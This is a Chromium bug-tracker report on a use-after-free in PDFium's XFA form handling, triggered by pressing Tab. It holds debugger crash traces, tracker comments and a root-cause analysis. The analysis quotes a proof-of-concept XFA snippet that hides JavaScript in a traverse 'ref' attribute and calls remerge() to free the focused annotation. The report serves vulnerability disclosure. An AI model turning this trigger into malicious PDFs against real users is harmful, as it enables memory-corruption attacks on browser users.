# Security: PDFium (XFA) Use-after-free in CPDFSDK_AnnotHandlerMgr::GetNextAnnot

| Field | Value |
|-------|-------|
| **Issue ID** | [40095553](https://issues.chromium.org/issues/40095553) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2019-07-01 |
| **Bounty** | $5,500.00 |

## Description

**VULNERABILITY DETAILS**  

Use-after-free in CPDFSDK\_AnnotHandlerMgr::GetNextAnnot

**VERSION**  

Operating System: Windows 10 64bit  

Chrome with enabled XFA PDFium

**REPRODUCTION CASE**  

Open file `poc.pdf` in chrome.exe with PageHeap is enabled  

Click to edit box and press `Tab` key to trigger crash

CRASH INFORMATION

(2534.24ac): Access violation - code c0000005 (first chance)  

First chance exceptions are reported before any exception handling.  

This exception may be expected and handled.  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\pdfium.dll  

eax=00000000 ebx=40cecfb8 ecx=4756cfe0 edx=012fd201 esi=2a26b46d edi=00000400  

eip=776b62a7 esp=012fd268 ebp=012fd2e4 iopl=0 nv up ei pl nz na pe nc  

cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010206  

pdfium!CPDFSDK\_AnnotHandlerMgr::GetNextAnnot+0xb7:  

776b62a7 8b11 mov edx,dword ptr [ecx] ds:002b:4756cfe0=????????

2:033> kp

# ChildEBP RetAddr

00 012fd2e4 776b6107 pdfium!CPDFSDK\_AnnotHandlerMgr::GetNextAnnot(class CPDFSDK\_Annot \* pSDKAnnot = 0x4756cfe0, bool bNext = true)+0xb7 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\fpdfsdk\cpdfsdk\_annothandlermgr.cpp @ 324]  

01 012fd340 776d72f1 pdfium!CPDFSDK\_AnnotHandlerMgr::Annot\_OnKeyDown(class CPDFSDK\_Annot \* pAnnot = 0x4756cfe0, int nKeyCode = 0n9, int nFlag = 0n1024)+0xe7 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\fpdfsdk\cpdfsdk\_annothandlermgr.cpp @ 236]  

02 012fd374 776fbf31 pdfium!CPDFSDK\_PageView::OnKeyDown(int nKeyCode = 0n9, int nFlag = 0n1024)+0x61 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\fpdfsdk\cpdfsdk\_pageview.cpp @ 482]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\chrome.dll  

03 012fd3a8 1ad2de18 pdfium!FORM\_OnKeyDown(struct fpdf\_form\_handle\_t\_\_ \* hHandle = 0x40cecfb8, struct fpdf\_page\_t\_\_ \* page = 0x40c00fe8, int nKeyCode = 0n9, int modifier = 0n1024)+0x61 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\third\_party\pdfium\fpdfsdk\fpdf\_formfill.cpp @ 479]  

04 012fd460 1ad2cd99 chrome!chrome\_pdf::PDFiumEngine::OnKeyDown(class pp::KeyboardInputEvent \* event = 0x012fd594)+0xb8 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\pdf\pdfium\pdfium\_engine.cc @ 1662]  

05 012fd668 1ad50f1d chrome!chrome\_pdf::PDFiumEngine::HandleEvent(class pp::InputEvent \* event = 0x012fd7d8)+0x249 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\pdf\pdfium\pdfium\_engine.cc @ 962]  

06 012fd7ec 194eebf6 chrome!chrome\_pdf::OutOfProcessInstance::HandleInputEvent(class pp::InputEvent \* event = 0x012fd81c)+0x60d [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\pdf\out\_of\_process\_instance.cc @ 846]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\ppapi\_proxy.dll  

07 012fd82c 507fa767 chrome!pp::InputEvent\_HandleEvent(int pp\_instance = 0n-628252331, int resource = 0n270)+0x96 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\cpp\module.cc @ 53]  

08 012fd85c 507fa6fa ppapi\_proxy!ppapi::CallWhileUnlocked<PP\_Bool,int,int,int,int>(<function> \* function = 0x194eeb60, int \* p1 = 0x012fd8b0, int \* p2 = 0x012fd894)+0x47 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\shared\_impl\proxy\_lock.h @ 136]  

09 012fd8a8 507fb09e ppapi\_proxy!ppapi::proxy::PPP\_InputEvent\_Proxy::OnMsgHandleFilteredInputEvent(int instance = 0n-628252331, struct ppapi::InputEventData \* data = 0x012fda80, <unnamed-tag> \* result = 0x012fd9d0)+0xaa [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\proxy\ppp\_input\_event\_proxy.cc @ 107]  

0a 012fd8ec 507fafc8 ppapi\_proxy!base::DispatchToMethodImpl<ppapi::proxy::PPP\_InputEvent\_Proxy \*,void (class ppapi::proxy::PPP\_InputEvent\_Proxy \*\* obj = 0x012fdb54, <function> \* method = 0x507fa650, class std::\_\_1::tuple<int,ppapi::InputEventData> \* in = 0x012fda78, class std::\_\_1::tuple<PP\_Bool> \* out = 0x012fd9d0)+0x8e [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\tuple.h @ 96]  

0b 012fd950 507fa5bc ppapi\_proxy!base::DispatchToMethod<ppapi::proxy::PPP\_InputEvent\_Proxy \*,void (class ppapi::proxy::PPP\_InputEvent\_Proxy \*\* obj = 0x012fdb54, <function> \* method = 0x507fa650, class std::\_\_1::tuple<int,ppapi::InputEventData> \* in = 0x012fda78, class std::\_\_1::tuple<PP\_Bool> \* out = 0x012fd9d0)+0x98 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\tuple.h @ 105]  

0c 012fdb48 507f9f8d ppapi\_proxy!IPC::MessageT<PpapiMsg\_PPPInputEvent\_HandleFilteredInputEvent\_Meta,std::\_\_1::tuple<int,ppapi::InputEventData>,std::\_\_1::tuple<PP\_Bool> >::Dispatch<ppapi::proxy::PPP\_InputEvent\_Proxy,ppapi::proxy::PPP\_InputEvent\_Proxy,void,void (class IPC::Message \* \*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\message\_support.dll  

msg = 0x3e4aafb8 {size = 0x90}, class ppapi::proxy::PPP\_InputEvent\_Proxy \* obj = 0x469f4fe8, class ppapi::proxy::PPP\_InputEvent\_Proxy \* sender = 0x469f4fe8, <function> \* func = 0x507fa650)+0x2cc [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ipc\ipc\_message\_templates.h @ 205]  

0d 012fdbc0 507397a7 ppapi\_proxy!ppapi::proxy::PPP\_InputEvent\_Proxy::OnMessageReceived(class IPC::Message \* msg = 0x3e4aafb8 {size = 0x90})+0x14d [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\proxy\ppp\_input\_event\_proxy.cc @ 85]  

0e 012fdc9c 50795c75 ppapi\_proxy!ppapi::proxy::Dispatcher::OnMessageReceived(class IPC::Message \* msg = 0x3e4aafb8 {size = 0x90})+0x127 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\proxy\dispatcher.cc @ 70]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\ipc.dll  

0f 012fdd70 633288df ppapi\_proxy!ppapi::proxy::PluginDispatcher::OnMessageReceived(class IPC::Message \* msg = 0x3e4aafb8 {size = 0x90})+0x2f5 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ppapi\proxy\plugin\_dispatcher.cc @ 273]  

10 012fdd90 6332ebff ipc!IPC::ChannelProxy::Context::OnDispatchMessage(class IPC::Message \* message = 0x3e4aafb8 {size = 0x90})+0x8f [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\ipc\ipc\_channel\_proxy.cc @ 326]  

11 012fddb8 6332eadc ipc!base::internal::FunctorTraits<void (<function> \* method = 0x63328850, class scoped\_refptr[IPC::ChannelProxy::Context](javascript:void(0);) \* receiver\_ptr = 0x3e4aafb0 [0x63381340] 0x42d16f10 {...}, class IPC::Message \* args = 0x3e4aafb8 {size = 0x90})+0x4f [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\bind\_internal.h @ 499]  

12 012fddf8 6332ea0f ipc!base::internal::InvokeHelper<0,void>::MakeItSo<void (<function> \*\* functor = 0x3e4aafa8, class scoped\_refptr[IPC::ChannelProxy::Context](javascript:void(0);) \* args = 0x3e4aafb0 [0x63381340] 0x42d16f10 {...}, class IPC::Message \* args = 0x3e4aafb8 {size = 0x90})+0x7c [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\bind\_internal.h @ 599]  

13 012fde1c 6332e8c4 ipc!base::internal::Invoker<base::internal::BindState<void (<function> \*\* functor = 0x3e4aafa8, class std::**1::tuple<scoped\_refptr[IPC::ChannelProxy::Context](javascript:void(0);),IPC::Message> \* bound = 0x3e4aafb0)+0x6f [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\bind\_internal.h @ 672]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\base.dll  

14 012fde44 68311bb0 ipc!base::internal::Invoker<base::internal::BindState<void (class base::internal::BindStateBase \* base = 0x3e4aaf90)+0x54 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\bind\_internal.h @ 641]  

15 012fde68 684e7d73 base!base::OnceCallback<void (void)+0x50 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\callback.h @ 98]  

16 012fe0f0 6853d457 base!base::TaskAnnotator::RunTask(char \* trace\_event\_name = 0x686ca607 "ThreadController::Task", struct base::PendingTask \* pending\_task = 0x012fe438)+0x5b3 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\task\common\task\_annotator.cc @ 144]  

17 012fe4a8 6853ca81 base!base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(class base::sequence\_manager::LazyNow \* continuation\_lazy\_now = 0x012fe548, bool \* ran\_task = 0x012fe563)+0x737 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc @ 368]  

18 012fe570 683d1ea0 base!base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork(void)+0xb1 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc @ 218]  

19 012fe5d0 6853e85c base!base::MessagePumpDefault::Run(class base::MessagePump::Delegate \* delegate = 0x3f2c4f2c)+0x60 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\message\_loop\message\_pump\_default.cc @ 39]  

1a 012fe864 68479d6b base!base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool application\_tasks\_allowed = true, class base::TimeDelta timeout = 9223372036854775807)+0x34c [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc @ 466]  

1b 012feb18 68479a05 base!base::RunLoop::RunWithTimeout(class base::TimeDelta timeout = 9223372036854775807)+0x34b [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\run\_loop.cc @ 163]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\content.dll  

1c 012feb40 1f6a7315 base!base::RunLoop::Run(void)+0x45 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\base\run\_loop.cc @ 131]  

1d 012fed28 2349fc26 content!content::PpapiPluginMain(struct content::MainFunctionParams \* parameters = 0x012fed9c)+0x5c5 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\content\ppapi\_plugin\ppapi\_plugin\_main.cc @ 160]  

1e 012fed54 234a0c75 content!content::RunOtherNamedProcessTypeMain(class std::1::basic\_string<char,std::1::char\_traits<char>,std::1::allocator<char> > \* process\_type = 0x012fedb8 "ppapi", struct content::MainFunctionParams \* main\_function\_params = 0x012fed9c, class content::ContentMainDelegate \* delegate = 0x012ff388)+0xa6 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\content\app\content\_main\_runner\_impl.cc @ 579]  

1f 012fef10 2349c500 content!content::ContentMainRunnerImpl::Run(bool start\_service\_manager\_only = false)+0x2c5 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\content\app\content\_main\_runner\_impl.cc @ 876]  

\*\*\* WARNING: Unable to verify checksum for C:\Users\huyna\_dev\Desktop\chromium\out\chromium\_pdfium\_xfa\embedder.dll  

20 012fef28 35e822e1 content!content::ContentServiceManagerMainDelegate::RunEmbedderProcess(void)+0x30 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\content\app\content\_service\_manager\_main\_delegate.cc @ 52]  

21 012ff2a8 2349fa4c embedder!service\_manager::Main(struct service\_manager::MainParams \* params = 0x012ff2cc)+0x6d1 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\services\service\_manager\embedder\main.cc @ 422]  

22 012ff2f4 16ee1315 content!content::ContentMain(struct content::ContentMainParams \* params = 0x012ff36c)+0x5c [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\content\app\content\_main.cc @ 20]  

\*\*\* WARNING: Unable to verify checksum for chrome.exe  

23 012ff3d0 003a8e33 chrome!ChromeMain(struct HINSTANCE \* instance = 0x003a0000, struct sandbox::SandboxInterfaceInfo \* sandbox\_info = 0x012ff464, int64 exe\_entry\_point\_ticks = 0n68802416047)+0x1f5 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\chrome\app\chrome\_main.cc @ 110]  

24 012ff4c8 003a1479 chrome\_exe!MainDllLoader::Launch(struct HINSTANCE \* instance = 0x003a0000, class base::TimeTicks exe\_entry\_point\_ticks = class base::TimeTicks)+0x453 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\chrome\app\main\_dll\_loader\_win.cc @ 202]  

25 012ff7a8 005ddd8e chrome\_exe!wWinMain(struct HINSTANCE \* instance = 0x003a0000, struct HINSTANCE** \* prev = 0x00000000)+0x479 [C:\Users\huyna\_dev\Desktop\chromium\chromium\_pdfium\_XFA\src\chrome\app\chrome\_exe\_main\_win.cc @ 229]  

26 012ff7c0 005ddee1 chrome\_exe!invoke\_main(void)+0x1e [f:\dd\vctools\crt\vcstartup\src\startup\exe\_common.inl @ 123]  

27 012ff818 005ddfad chrome\_exe!\_\_scrt\_common\_main\_seh(void)+0x151 [f:\dd\vctools\crt\vcstartup\src\startup\exe\_common.inl @ 283]  

28 012ff820 005ddfb8 chrome\_exe!\_\_scrt\_common\_main(void)+0xd [f:\dd\vctools\crt\vcstartup\src\startup\exe\_common.inl @ 326]  

29 012ff828 75f80419 chrome\_exe!wWinMainCRTStartup(void)+0x8 [f:\dd\vctools\crt\vcstartup\src\startup\exe\_wwinmain.cpp @ 17]  

2a 012ff838 7706662d KERNEL32!BaseThreadInitThunk+0x19  

2b 012ff894 770665fd ntdll!\_\_RtlUserThreadStart+0x2f  

2c 012ff8a4 00000000 ntdll!\_RtlUserThreadStart+0x1b

## Attachments

- [poc.pdf](attachments/poc.pdf) (application/pdf, 9.5 KB)
- [crash_info.txt](attachments/crash_info.txt) (text/plain, 17.7 KB)

## Timeline

### cl...@chromium.org (2019-07-01)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6422072180211712.

### cl...@chromium.org (2019-07-01)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-07-01)

Testcase 6422072180211712 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6422072180211712.

### jd...@chromium.org (2019-07-01)

tsepez@: You're a lot better equipped to judge these than I am. Can you take a look at this and re-route if needed? Thanks a ton.

[Monorail components: Internals>Plugins>PDF]

### jd...@chromium.org (2019-07-01)

[Empty comment from Monorail migration]

### ts...@chromium.org (2019-07-01)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-07-12)

[Empty comment from Monorail migration]

### hu...@gmail.com (2019-07-24)

[Comment Deleted]

### hu...@gmail.com (2019-07-24)

Hi guys, 

Here is my detail description about this bug. Hope this can give you more information. 

===================================================================================================

BRIEF INFORMATION

Use-after-free of `CPDFSDK_Annot` object in function `CPDFSDK_AnnotHandlerMgr::GetNextAnnot`

VULNERABILITY DETAILS 

When we press any key in pdf view of chrome, function `Annot_OnKeyDown` will be called
```
bool CPDFSDK_AnnotHandlerMgr::Annot_OnKeyDown(CPDFSDK_Annot* pAnnot,
                                              int nKeyCode,
                                              int nFlag) {
  if (CPDFSDK_FormFillEnvironment::IsCTRLKeyDown(nFlag) ||
      CPDFSDK_FormFillEnvironment::IsALTKeyDown(nFlag)) {
    return GetAnnotHandler(pAnnot)->OnKeyDown(pAnnot, nKeyCode, nFlag);
  }

  CPDFSDK_PageView* pPage = pAnnot->GetPageView();
  CPDFSDK_Annot* pFocusAnnot = pPage->GetFocusAnnot();
  if (pFocusAnnot && (nKeyCode == FWL_VKEY_Tab)) {
    ObservedPtr<CPDFSDK_Annot> pNext(GetNextAnnot(
        pFocusAnnot, !CPDFSDK_FormFillEnvironment::IsSHIFTKeyDown(nFlag)));
    if (pNext && pNext.Get() != pFocusAnnot) {
      pPage->GetFormFillEnv()->SetFocusAnnot(&pNext);
      return true;
    }
  }

  return GetAnnotHandler(pAnnot)->OnKeyDown(pAnnot, nKeyCode, nFlag);
}
```
This function will check what kind of key we press and call a corresponding handler. If the key is press is `Tab` then 
this code section will be executed
```
  if (pFocusAnnot && (nKeyCode == FWL_VKEY_Tab)) {
    ObservedPtr<CPDFSDK_Annot> pNext(GetNextAnnot(
        pFocusAnnot, !CPDFSDK_FormFillEnvironment::IsSHIFTKeyDown(nFlag)));
    if (pNext && pNext.Get() != pFocusAnnot) {
      pPage->GetFormFillEnv()->SetFocusAnnot(&pNext);
      return true;
    }
  }
```
Based on this code, we can guess that when we press `Tab` key, it'll get a next annot (`CPDFSDK_Annot` object) and set 
focus to this annot. To get next annot, it uses function `GetNextAnnot` 
```
CPDFSDK_Annot* CPDFSDK_AnnotHandlerMgr::GetNextAnnot(CPDFSDK_Annot* pSDKAnnot,
                                                     bool bNext) {
#ifdef PDF_ENABLE_XFA
  CPDFSDK_PageView* pPageView = pSDKAnnot->GetPageView();
  CPDFXFA_Page* pPage = pPageView->GetPDFXFAPage();
  if (pPage && !pPage->AsPDFPage()) {
    // For xfa annots in XFA pages not backed by PDF pages.
    std::unique_ptr<IXFA_WidgetIterator> pWidgetIterator(
        pPage->GetXFAPageView()->CreateWidgetIterator(
            XFA_TRAVERSEWAY_Tranvalse, XFA_WidgetStatus_Visible |
                                           XFA_WidgetStatus_Viewable |
                                           XFA_WidgetStatus_Focused));
    if (!pWidgetIterator)
      return nullptr;
    if (pWidgetIterator->GetCurrentWidget() != pSDKAnnot->GetXFAWidget())
      pWidgetIterator->SetCurrentWidget(pSDKAnnot->GetXFAWidget());
    CXFA_FFWidget* hNextFocus = bNext ? pWidgetIterator->MoveToNext()
                                      : pWidgetIterator->MoveToPrevious();
    if (!hNextFocus && pSDKAnnot)
      hNextFocus = pWidgetIterator->MoveToFirst();

    return pPageView->GetAnnotByXFAWidget(hNextFocus);
  }
#endif  // PDF_ENABLE_XFA

  // For PDF annots.
  CPDFSDK_Widget* pWidget = ToCPDFSDKWidget(pSDKAnnot);
  CPDFSDK_AnnotIterator ai(pWidget->GetPageView(), pWidget->GetAnnotSubtype());
  return bNext ? ai.GetNextAnnot(pWidget) : ai.GetPrevAnnot(pWidget);
}
```
In this function, it created `IXFA_WidgetIterator` object to get all annot objects in an order and get the next one by 
`pWidgetIterator->MoveToNext()` (or `pWidgetIterator->MoveToPrevious()`). And we can manage to trigger calling JS code 
in function `CreateWidgetIterator` by using `ref` attribute of `traverse` tag. 

To understand how we can embed JS script in `ref` attribute and trigger to execute it, let's take a look xml section of 
poc file
```
<subform h="10.5in" w="8in">
...
    <field h="500.0001mm" name="DropDownList2" w="500.625mm" x="0mm" y="0mm">
        <ui>
            <textEdit>
            </textEdit>
        </ui>
        <traversal>
            <traverse operation="next" ref="$xfa.(eval('try { if (aaaa == 1) {xfa.host.setFocus(field_DropDownList1);xfa.template.remerge();xfa.host.openList(field_DropDownList1);} } catch(e){xfa.host.beep(2);}') == 0)"/> 
        </traversal>
    </field>
</subform>
``` 
We see that there is a `textEdit` field with name `DropDownList2`. It has a `traverse` sub-element with `ref` attribute. 
Based on XFA specification (XML Forms Architecture (XFA) Specification Version 3.3), `traversal` element is used to 
define navigation between objects on a form and supports speech programs. Such as when you press the `Tab` key, 
it'll change focus to other field base on attributes defined in `traversal` element. `ref` attribute is an attribute of 
`traverse` element. It uses to determine the next field is choosed. It's a XFA SOM define the next field. 

A root cause of executing JS script that embedded in `ref` attribute is function `CFXJSE_Engine::ResolveObjects`. 
This function will resolve XFA SOM expression to get an corresponding object in XFA tree. Based on XFA specification , 
a JS script can be embedded into this SOM expression string. This JS will be executed when program tries to resolve 
SOM expression string.

Here is brief callstack (check `crash_info` file to get full stacktrace) when the JS script embedded in `ref` attribute of 
`traverse` element is executed (I set a breakpoint when JS code in `ref` attribute is executed)
```
...
18 008fcb08 0b25ac59 pdfium!CFXJSE_Context::ExecuteScript(char * szScript = 0x4e72401c "eval('try { if (aaaa == 1) {xfa_log_bp(bb0);xfa.host.setFocus(f1);xfa.template.remerge();xfa.host.openList(f1);} } catch(e){xfa.host.beep(2);}') == 0", class CFXJSE_Value * lpRetValue = 0x1fdd5630, class CFXJSE_Value * lpNewThisObject = 0x1fdd56d8)+0x9b0 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_context.cpp @ 300] 
19 008fcbe8 0b28fda2 pdfium!CFXJSE_Engine::RunScript(CXFA_Script::Type eScriptType = Javascript (0n1), class fxcrt::StringViewTemplate<wchar_t> wsScript = class fxcrt::StringViewTemplate<wchar_t>, class CFXJSE_Value * hRetValue = 0x1fdd5630, class CXFA_Object * pThisObject = 0x1fddb020)+0x349 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_engine.cpp @ 153] 
1a 008fcca8 0b28cae8 pdfium!`anonymous namespace'::DoPredicateFilter(class fxcrt::WideString wsCondition = class fxcrt::WideString, unsigned int iFoundCount = 1, class CFXJSE_ResolveNodeData * pRnd = 0x008fcfa8)+0x2e2 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_resolveprocessor.cpp @ 47] 
1b 008fcd4c 0b28be16 pdfium!CFXJSE_ResolveProcessor::FilterCondition(class fxcrt::WideString wsCondition = class fxcrt::WideString, class CFXJSE_ResolveNodeData * pRnd = 0x008fcfa8)+0x398 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_resolveprocessor.cpp @ 697] 
1c 008fcdd0 0b28b341 pdfium!CFXJSE_ResolveProcessor::ResolveDollar(class CFXJSE_ResolveNodeData * rnd = 0x008fcfa8)+0x1f6 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_resolveprocessor.cpp @ 174] 
1d 008fce54 0b25b8c5 pdfium!CFXJSE_ResolveProcessor::Resolve(class CFXJSE_ResolveNodeData * rnd = 0x008fcfa8)+0x161 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_resolveprocessor.cpp @ 80] 
1e 008fcff0 0b2ea8b0 pdfium!CFXJSE_Engine::ResolveObjects(class CXFA_Object * refObject = 0x1fda6300, class fxcrt::StringViewTemplate<wchar_t> wsExpression = class fxcrt::StringViewTemplate<wchar_t>, struct XFA_RESOLVENODE_RS * resolveNodeRS = 0x008fd058, unsigned int dwStyles = 0x69, class CXFA_Node * bindNode = 0x00000000)+0x615 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fxjs\xfa\cfxjse_engine.cpp @ 661] 
1f 008fd084 0b303717 pdfium!CXFA_FFDocView::GetWidgetByName(class fxcrt::WideString * wsName = 0x008fd0e8, class CXFA_FFWidget * pRefWidget = 0x010eb080)+0x120 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffdocview.cpp @ 430] 
20 008fd0a4 0b3035b0 pdfium!CXFA_FFTabOrderPageWidgetIterator::FindWidgetByName(class fxcrt::WideString * wsWidgetName = 0x008fd0e8, class CXFA_FFWidget * pRefWidget = 0x010eb080)+0x37 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffpageview.cpp @ 335] 
21 008fd0f0 0b302c95 pdfium!CXFA_FFTabOrderPageWidgetIterator::GetTraverseWidget(class CXFA_FFWidget * pWidget = 0x010eb080)+0xf0 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffpageview.cpp @ 327] 
22 008fd178 0b3029d6 pdfium!CXFA_FFTabOrderPageWidgetIterator::CreateTabOrderWidgetArray(void)+0x235 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffpageview.cpp @ 370] 
23 008fd188 0b302976 pdfium!CXFA_FFTabOrderPageWidgetIterator::Reset(void)+0x16 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffpageview.cpp @ 247] 
24 008fd1b8 0b30179c pdfium!CXFA_FFTabOrderPageWidgetIterator::CXFA_FFTabOrderPageWidgetIterator(class CXFA_FFPageView * pPageView = 0x1fdd5b38, unsigned int dwFilter = 0x188)+0xa6 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffpageview.cpp @ 241] 
25 008fd1ec 0b3016a2 pdfium!pdfium::MakeUnique<CXFA_FFTabOrderPageWidgetIterator,CXFA_FFPageView *,unsigned int &>(class CXFA_FFPageView ** args = 0x008fd228, unsigned int * args = 0x008fd250)+0x5c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\third_party\base\ptr_util.h @ 56] 
26 008fd240 0b127089 pdfium!CXFA_FFPageView::CreateWidgetIterator(unsigned int dwTraverseWay = 1, unsigned int dwWidgetFilter = 0x188)+0x72 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffpageview.cpp @ 137] 
27 008fd2c4 0b126f27 pdfium!CPDFSDK_AnnotHandlerMgr::GetNextAnnot(class CPDFSDK_Annot * pSDKAnnot = 0x1fc938e8, bool bNext = true)+0x79 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_annothandlermgr.cpp @ 317] 
28 008fd320 0b1480f1 pdfium!CPDFSDK_AnnotHandlerMgr::Annot_OnKeyDown(class CPDFSDK_Annot * pAnnot = 0x1fc938e8, int nKeyCode = 0n9, int nFlag = 0n1024)+0xe7 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_annothandlermgr.cpp @ 236] 
29 008fd354 0b16cfd1 pdfium!CPDFSDK_PageView::OnKeyDown(int nKeyCode = 0n9, int nFlag = 0n1024)+0x61 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_pageview.cpp @ 482] 
2a 008fd388 130dde18 pdfium!FORM_OnKeyDown(struct fpdf_form_handle_t__ * hHandle = 0x1fd0adc8, struct fpdf_page_t__ * page = 0x1fd3bd88, int nKeyCode = 0n9, int modifier = 0n1024)+0x61 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\fpdf_formfill.cpp @ 479] 
2b 008fd440 130dcd99 chrome!chrome_pdf::PDFiumEngine::OnKeyDown(class pp::KeyboardInputEvent * event = 0x008fd574)+0xb8 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 1662] 
